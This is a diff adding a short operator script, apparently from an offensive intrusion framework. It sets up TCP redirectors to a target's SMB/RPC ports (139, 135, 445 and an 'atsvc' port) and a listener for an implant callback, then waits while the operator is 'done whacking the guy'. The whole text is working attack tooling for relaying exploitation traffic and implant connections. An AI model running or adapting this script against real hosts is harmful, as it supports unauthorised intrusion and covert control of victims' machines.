@@ -1,0 +1,51 @@
+if ($argc < 2) {
+    echo "Usage: $argv[0] <targetIP> <targetPort> <callbackPort>\r\n";
+    return false;
+}
+
+
+string $target= $argv[1];
+string $targetPort="139";
+string $callbackPort="1330";
+
+if ($argc >= 3) {
+	$targetPort=$argv[2];
+}
+if ($argc >= 4) {
+	$callbackPort=$argv[3];
+}
+
+string $localPort="1390";
+if ($targetPort == "135") {
+	$localPort="1351";
+} else if ($targetPort == "445") {
+	$localPort="4450";
+}
+
+@echo off;
+ifnot (`redirect ?`) {
+    echo "*** Redirect command not found...unable to complete script ***";
+    return false;
+	@echo on;
+}
+@echo on;
+
+ifnot (`background redirect -tcp -lplisten $localPort -target $target $targetPort`) {
+	return false;
+}
+ifnot (`background redirect -tcp -nodes 40 -implantlisten $callbackPort -target 127.0.0.1 $callbackPort`) {
+	return false;
+}
+
+string $atsvcPort=GetInput("What is the atsvc port?");
+ifnot (`background redirect -tcp -lplisten 1350 -target $target $targetPort`) {
+	return false;
+}
+
+echo "Hit return when you're done whacking the guy.\n";
+pause;
+`stop redirect -contains "tcp -lplisten $localPort -target $target $targetPort"`;
+`stop redirect -contains "tcp -lplisten 1350 -target $target $targetPort"`;
+
+echo "All redirectors have been started";
+return true;
